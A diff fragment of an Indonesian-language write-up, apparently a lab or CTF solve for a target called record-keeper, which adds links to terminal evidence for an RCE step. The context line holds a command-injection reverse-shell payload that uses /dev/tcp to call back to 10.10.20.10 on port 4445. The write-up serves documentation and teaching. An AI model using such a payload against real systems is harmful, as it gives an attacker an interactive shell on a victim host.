@@ -55,3 +55,13 @@ id;exec 4<>/dev/tcp/10.10.20.10/4445;bash -i <&4 >&4 2>&4
 ```
 
 Exploit juga mengirim token acak + output `id` ke callback sebagai bukti RCE.
+
+### Evidence langkah ini
+
+![term-02-cve-2026-111497.png](assets/record-keeper-user/term-02-cve-2026-111497.png)
+
+*Terminal evidence — `02-cve-2026-111497.txt` (arsip transkrip sesi solve).*
+
+**Berkas mentah langkah ini:**
+
+- [`02-cve-2026-111497.txt`](assets/record-keeper-user/02-cve-2026-111497.txt)
